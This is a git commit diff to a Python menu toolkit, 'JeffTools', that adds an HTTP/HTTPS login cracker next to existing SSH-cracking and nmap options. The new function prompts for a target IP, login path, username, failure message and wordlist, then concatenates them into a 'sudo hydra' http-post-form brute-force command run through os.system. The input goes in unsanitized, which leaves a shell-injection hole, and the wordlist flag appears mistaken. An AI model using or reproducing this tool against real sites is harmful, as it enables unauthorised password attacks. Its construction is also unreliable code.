bf581ce5c8f2a08914a4552f2a1cb998ceebbf3f
lodex23 <81414802+lodex23@users.noreply.github.com>
2022-03-01 00:22:55 +0100

    Add files via upload

--- JeffTools.py
+++ JeffTools.py
@@ -7,8 +7,9 @@ os.system('clear')
 print("------------------------------------------")
 print("1) airscript")
 print("2) cracker   | SSH")
-print("3) AMFinder")
-print("4) nmapper")
+print("3) cracker   | http/https")
+print("4) AMFinder")
+print("5) nmapper")
 print("------------------------------------------")
 
 tool = input("Enter the tool u want to use(ctrl + C to exit): ")
@@ -200,6 +201,71 @@ def Function_nmapper():
 
 
 
+def Function_cracker_http():
+    import os
+
+
+
+    username = input("Enter username:")
+    print("---------------------------")
+    print("Set Username to: " + username)
+    print("---------------------------")
+
+    cmd = 'clear'
+    os.system(cmd)
+
+    ip = input("Enter Ip:")
+    print("---------------------------")
+    print("Set ip to: " + ip)
+    print("---------------------------")
+
+    cmd = 'clear'
+    os.system(cmd)
+
+    method = "http-post-form"
+
+    location = input("Specify path to attack:")
+    print("---------------------------")
+    print("Set path to: " + location)
+    print("---------------------------")
+
+    cmd = 'clear'
+    os.system(cmd)
+
+
+    fail = input("Enter Failure Message: ")
+    print("----------------------------")
+    print("Set message to: " + fail)
+    print("----------------------------")
+
+    os.system(cmd)
+
+    wordls = input("Enter the path of the wordlist: ")
+    print("----------------------------")
+    print("set wordlist to: " + wordls)
+    print("----------------------------")
+    input("Press enter to start attack")
+
+    os.system(cmd)
+
+
+
+    hydra1 = 'sudo hydra -l '
+    hydra2 = ' -p '
+    hydra3 = ' "'
+    hydra4 = ':username='
+    hydra5 = '&password=^PASS^:'
+    hydra6 = '"'
+
+    os.system(hydra1 + username + hydra2 + wordls + ' ' + ip + ' ' + method + hydra3 + location + hydra4 + username + hydra5 + fail + hydra6)
+
+
+
+
+
+
+
+
 if tool == "1":
     Function_airscript()
 
@@ -207,12 +273,14 @@ elif tool =="2":
     Function_cracker_ssh()
 
 elif tool == "3":
-    Function_AMFinder()
+    Function_cracker_http()
 
 elif tool == "4":
+    Function_AMFinder()
+
+elif tool == "5":
     Function_nmapper()
 
 else:
     print("Invalid number pls try again")
     os.system('JeffTools')
-    
